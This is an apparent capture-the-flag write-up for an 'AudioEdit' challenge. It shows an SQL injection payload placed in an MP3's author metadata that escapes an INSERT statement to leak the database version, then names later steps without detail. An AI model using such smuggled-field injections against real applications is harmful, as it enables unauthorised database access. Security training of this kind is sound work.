Title: AudioEdit

The challenge description said "I made this cool site for editing audio files. Can you exploit it?".
After visiting the site, I got a simple page with written "AudioEdit" with the chance of upload a .mp3 audio file.

The provided file will be uploaded and the discovered insertion statement in the db looks like this:
```
INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);
```

In order to do an SQL-injection we have to create a special author and title field. I used easyTAG but of course you can use the tool of your choice to modify mp3 metadata. In order to inject and maintain a valid INSERT statement you can create a mp3 with the following metadata:
```
title  = "" (not important)
author = a', (SELECT @@version))-- -b
```

which creates the following statement
```
INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);
```
This gave us the database version.

Next we wanted to know the tables name.
And of course the columns names.
Finally we get the flag.
